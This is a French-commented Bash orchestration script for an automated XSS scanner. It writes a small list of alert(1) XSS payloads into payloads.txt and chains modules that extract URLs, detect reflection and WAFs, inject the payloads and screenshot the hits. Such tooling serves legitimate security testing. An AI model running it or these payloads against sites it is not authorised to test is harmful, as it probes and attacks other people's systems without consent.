#!/bin/bash
set -euo pipefail

# Couleurs pour output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

printf "${BLUE}🚀 XSS Scanner Advanced Pipeline${NC}\n"
printf "==================================\n"

# Demande du chemin du fichier brut d'URLs
printf "Chemin vers le fichier d'URLs brutes : "
read INPUT_FILE
if [ ! -f "$INPUT_FILE" ]; then
  printf "${RED}[ERROR] Fichier introuvable : $INPUT_FILE${NC}\n" >&2
  exit 1
fi

# Vérification du fichier payloads
if [ ! -f "payloads.txt" ]; then
  printf "${YELLOW}[WARN] Fichier payloads.txt introuvable${NC}\n"
  printf "${BLUE}[INFO] Création d'un fichier payloads basique...${NC}\n"
  cat > payloads.txt << 'EOF'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
'><script>alert(1)</script>
REFLECTION_TEST_123
EOF
  printf "${GREEN}[OK] Fichier payloads.txt créé avec 7 payloads basiques${NC}\n"
fi

# Détermination du répertoire de base
BASE_DIR=$(dirname "$INPUT_FILE")

# Emplacement temporaire des dossiers à la racine
TMP_DATA_DIR="$(pwd)/data"
TMP_SCREENSHOT_DIR="$(pwd)/screenshots"
mkdir -p "$TMP_DATA_DIR" "$TMP_SCREENSHOT_DIR"

printf "${BLUE}[INFO] Configuration du scan...${NC}\n"

# Génération d'un config.sh dynamique à la racine
cat > config.sh <<EOF
# Variables dynamiques de configuration — Générée automatiquement
INPUT_FILE="$INPUT_FILE"

# Dossiers temporaires
DATA_DIR="$TMP_DATA_DIR"
SCREENSHOT_DIR="$TMP_SCREENSHOT_DIR"

# Fichiers de sortie
EXTRACTED_URLS="$TMP_DATA_DIR/extracted_urls.txt"
REFLECTED_OUTPUT="$TMP_DATA_DIR/reflected_output.txt"
CLEANED_REFLECTED_URLS="$TMP_DATA_DIR/cleaned_reflected_urls.txt"
XSS_CANDIDATES="$TMP_DATA_DIR/xss_candidates.txt"
WAF_REPORT="$TMP_DATA_DIR/waf_analysis.txt"
SCREENSHOT_REPORT="$TMP_DATA_DIR/screenshot_report.html"
SCREENSHOTS_DIR="$TMP_DATA_DIR/screenshots"

# Fichiers système reprise
CHECKPOINT_DIR="$TMP_DATA_DIR/checkpoints"
LOCK_DIR="$TMP_DATA_DIR/locks"
RESUME_LOG="$TMP_DATA_DIR/resume.log"

# Configuration
PAYLOAD_FILE="payloads.txt"
THREADS=10
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/100 Safari/537.36"
TIMEOUT=15
RATE_LIMIT=10
MAX_RETRIES=3

# Modules améliorés
WAF_DETECTION=true
DETAILED_ANALYSIS=true
MIN_EXECUTABILITY_SCORE=40
TEST_POST=false
TEST_HEADERS=false
CUSTOM_HEADERS=""
CACHE_DIR="$TMP_DATA_DIR/cache"

# Screenshots
BROWSER_WIDTH=1920
BROWSER_HEIGHT=1080
CAPTURE_ALERTS=true
COMPARE_MODE=true
MAX_SCREENSHOTS=100
SCREENSHOT_FORMAT=png

# Système reprise
AUTO_RESUME=true
CHECKPOINT_INTERVAL=100
MAX_LOCK_AGE=3600
CLEANUP_OLD_CHECKPOINTS=true
BACKUP_RESULTS=true

# Logging
LOG_LEVEL=${LOG_LEVEL:-INFO}

# Export pour sous-scripts
export INPUT_FILE EXTRACTED_URLS REFLECTED_OUTPUT CLEANED_REFLECTED_URLS 
export XSS_CANDIDATES SCREENSHOT_DIR PAYLOAD_FILE THREADS USER_AGENT
export DATA_DIR WAF_REPORT SCREENSHOT_REPORT SCREENSHOTS_DIR
export CHECKPOINT_DIR LOCK_DIR RESUME_LOG TIMEOUT RATE_LIMIT MAX_RETRIES
export WAF_DETECTION DETAILED_ANALYSIS MIN_EXECUTABILITY_SCORE 
export TEST_POST TEST_HEADERS CUSTOM_HEADERS CACHE_DIR
export BROWSER_WIDTH BROWSER_HEIGHT CAPTURE_ALERTS COMPARE_MODE
export MAX_SCREENSHOTS SCREENSHOT_FORMAT AUTO_RESUME CHECKPOINT_INTERVAL
export MAX_LOCK_AGE CLEANUP_OLD_CHECKPOINTS BACKUP_RESULTS LOG_LEVEL
EOF

# Chargement de la configuration
. ./config.sh

printf "${GREEN}[OK] Configuration chargée${NC}\n"
printf "${BLUE}[INFO] Début du scan avec les paramètres :${NC}\n"
printf "  - URLs source: %s\n" "$INPUT_FILE"
printf "  - Payloads: %s (%s payloads)\n" "$PAYLOAD_FILE" "$(wc -l < "$PAYLOAD_FILE" 2>/dev/null || echo "0")"
printf "  - Threads: %s\n" "$THREADS"
printf "  - Seuil exécutabilité: %s\n" "$MIN_EXECUTABILITY_SCORE"
printf "  - Détection WAF: %s\n" "$WAF_DETECTION"
printf "  - Log level: %s\n" "$LOG_LEVEL"
printf "\n"

# Création des dossiers nécessaires
mkdir -p "$DATA_DIR" "$SCREENSHOTS_DIR" "$CHECKPOINT_DIR" "$LOCK_DIR" "$CACHE_DIR"

# Fonction de gestion d'erreur
handle_error() {
  printf "${RED}[ERROR] Échec du module %s${NC}\n" "$1" >&2
  printf "${YELLOW}[INFO] Fichiers intermédiaires conservés dans %s${NC}\n" "$TMP_DATA_DIR"
  exit 1
}

# Vérification modules disponibles
check_module() {
  local module="$1"
  if [ ! -f "modules/$module" ]; then
    printf "${YELLOW}[WARN] Module %s introuvable, utilisation version basique${NC}\n" "$module"
    return 1
  fi
  return 0
}

printf "${BLUE}🔄 Lancement des modules...${NC}\n"
printf "\n"

# Module 1: Extraction URLs
printf "${BLUE}[1/5] 📥 Extraction des URLs...${NC}\n"
if ! . modules/01_extract_urls.sh; then
  handle_error "01_extract_urls.sh"
fi
printf "${GREEN}[1/5] ✅ URLs extraites: %s${NC}\n" "$(wc -l < "$EXTRACTED_URLS" 2>/dev/null || echo "0")"

# Module 2: Vérification réflexion (version améliorée si disponible)
printf "${BLUE}[2/5] 🔍 Vérification réflexion + détection WAF...${NC}\n"
if check_module "02_check_reflection.sh"; then
  if ! . modules/02_check_reflection.sh; then
    handle_error "02_check_reflection.sh"
  fi
else
  printf "${YELLOW}[2/5] ⚠️  Module 02 amélioré introuvable, saut d'étape${NC}\n"
  cp "$EXTRACTED_URLS" "$CLEANED_REFLECTED_URLS" 2>/dev/null || true
fi
printf "${GREEN}[2/5] ✅ Réflexion vérifiée${NC}\n"

# Module 3: Nettoyage URLs
printf "${BLUE}[3/5] 🧹 Nettoyage des URLs...${NC}\n"
if ! . modules/03_clean_urls.sh; then
  handle_error "03_clean_urls.sh"
fi
printf "${GREEN}[3/5] ✅ URLs nettoyées: %s${NC}\n" "$(wc -l < "$CLEANED_REFLECTED_URLS" 2>/dev/null || echo "0")"

# Module 4: Injection payloads (version améliorée si disponible)
printf "${BLUE}[4/5] 💉 Injection des payloads...${NC}\n"
if check_module "04_inject_payloads.sh"; then
  if ! . modules/04_inject_payloads.sh; then
    handle_error "04_inject_payloads.sh"
  fi
else
  printf "${YELLOW}[4/5] ⚠️  Module 04 amélioré introuvable, utilisation version basique${NC}\n"
  if ! . modules/04_inject_payloads.sh; then
    handle_error "04_inject_payloads.sh (basique)"
  fi
fi

# Compter les résultats
xss_count=$(grep -v '^#' "$XSS_CANDIDATES" 2>/dev/null | wc -l || echo "0")
printf "${GREEN}[4/5] ✅ Injection terminée: %s candidats XSS trouvés${NC}\n" "$xss_count"

# Module 5: Screenshots (optionnel)
printf "${BLUE}[5/5] 📸 Capture de screenshots...${NC}\n"
if [ "$xss_count" -gt 0 ]; then
  if check_module "05_screenshot.sh" || check_module "05b_screenshot_advanced.sh"; then
    # Essayer version avancée d'abord
    if check_module "05b_screenshot_advanced.sh"; then
      printf "${BLUE}[5/5] 🎯 Utilisation des screenshots avancés...${NC}\n"
      . modules/05b_screenshot_advanced.sh 2>/dev/null || . modules/05_screenshot.sh
    else
      . modules/05_screenshot.sh
    fi
    printf "${GREEN}[5/5] ✅ Screenshots capturés${NC}\n"
  else
    printf "${YELLOW}[5/5] ⚠️  Module screenshots introuvable, saut d'étape${NC}\n"
  fi
else
  printf "${YELLOW}[5/5] ⚠️  Aucun XSS trouvé, pas de screenshots${NC}\n"
fi

printf "\n"
printf "${GREEN}🎉 Scan terminé avec succès !${NC}\n"
printf "\n"

# Résumé des résultats
printf "${BLUE}📊 Résumé des résultats :${NC}\n"
printf "  - URLs extraites: %s\n" "$(wc -l < "$EXTRACTED_URLS" 2>/dev/null || echo "0")"
printf "  - URLs testées: %s\n" "$(wc -l < "$CLEANED_REFLECTED_URLS" 2>/dev/null || echo "0")"
printf "  - XSS candidats: %s\n" "$xss_count"

if [ -f "$WAF_REPORT" ]; then
  waf_count=$(wc -l < "$WAF_REPORT" 2>/dev/null || echo "0")
  printf "  - WAF détectés: %s\n" "$waf_count"
fi

printf "  - Résultats dans: %s/\n" "$TMP_DATA_DIR"

# Déplacement final vers le répertoire de base
printf "${BLUE}📁 Déplacement des résultats...${NC}\n"

# Créer le dossier de destination
mkdir -p "$BASE_DIR/data" "$BASE_DIR/screenshots"

# Déplacer data
if [ -d "$TMP_DATA_DIR" ]; then
  if command -v rsync >/dev/null 2>&1; then
    rsync -av "$TMP_DATA_DIR/" "$BASE_DIR/data/"
  else
    cp -r "$TMP_DATA_DIR/"* "$BASE_DIR/data/" 2>/dev/null || true
  fi
  rm -rf "$TMP_DATA_DIR"
fi

# Déplacer screenshots
if [ -d "$TMP_SCREENSHOT_DIR" ]; then
  if command -v rsync >/dev/null 2>&1; then
    rsync -av "$TMP_SCREENSHOT_DIR/" "$BASE_DIR/screenshots/"
  else
    cp -r "$TMP_SCREENSHOT_DIR/"* "$BASE_DIR/screenshots/" 2>/dev/null || true
  fi
  rm -rf "$TMP_SCREENSHOT_DIR"
fi

printf "${GREEN}✅ Résultats déplacés vers %s/${NC}\n" "$BASE_DIR"
printf "\n"

# Affichage des fichiers principaux
printf "${BLUE}📋 Fichiers de résultats principaux :${NC}\n"
[ -f "$BASE_DIR/data/xss_candidates.txt" ] && printf "  - XSS: %s/data/xss_candidates.txt\n" "$BASE_DIR"
[ -f "$BASE_DIR/data/waf_analysis.txt" ] && printf "  - WAF: %s/data/waf_analysis.txt\n" "$BASE_DIR"
[ -f "$BASE_DIR/data/screenshot_report.html" ] && printf "  - Report: %s/data/screenshot_report.html\n" "$BASE_DIR"

printf "\n"
printf "${GREEN}🎯 Scan XSS terminé !${NC}\n"